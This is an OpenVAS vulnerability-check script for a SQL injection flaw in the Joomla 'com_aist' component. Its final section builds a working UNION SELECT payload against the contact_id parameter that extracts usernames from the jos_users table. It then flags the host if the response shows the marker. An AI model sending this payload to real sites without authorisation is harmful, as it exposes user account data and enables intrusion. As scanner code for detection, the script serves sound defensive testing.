##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_com_aist_sql_inj_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Joomla Component 'com_aist' SQL Injection Vulnerability 
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let attackers to injection arbitrary SQL
  constructs and gain sensitive information.
  Impact Level: Application.";
tag_affected = "Joomla! Aist component";
tag_insight = "Input passed via the 'view' parameter to 'index.php' is not properly
  sanitised before using to construct SQL queries.";
tag_solution = "No solution or patch is available as of 11th May, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://extensions.joomla.org/";
tag_summary = "This host is running Joomla! and is prone to SQL injection
  vulnerability.";

if(description)
{
  script_id(801787);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-05-18 15:37:30 +0200 (Wed, 18 May 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Joomla Component com_aist SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/100891/joomlaaist-sql.txt");

  script_description(desc);
  script_summary("Check if Joomla Aist component is vulnerable for SQL Injection attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

joomlaPort = get_http_port(default:80);
if(!joomlaPort){
  exit(0);
}

if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
  exit(0);
}

sndReq = http_get(item:string(joomlaDir, '/index.php?option=com_aist&view=vaca' +
         'ncylist&contact_id=-3 AND 1=2 UNION SELECT 1,2,3,4,group_concat(username,' +
         '0x3a,0x4f70656e564153)g3mb3lzfeatnuxbie,6,7,8,9,10,11,12,13,14,15,16,' +
         '17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36 from ' +
         'jos_users--'), port:joomlaPort);
rcvRes = http_send_recv(port:joomlaPort, data:sndReq);

if('> admin:OpenVAS(.+):OpenVAS<' >< rcvRes){
  security_hole(joomlaPort);
}
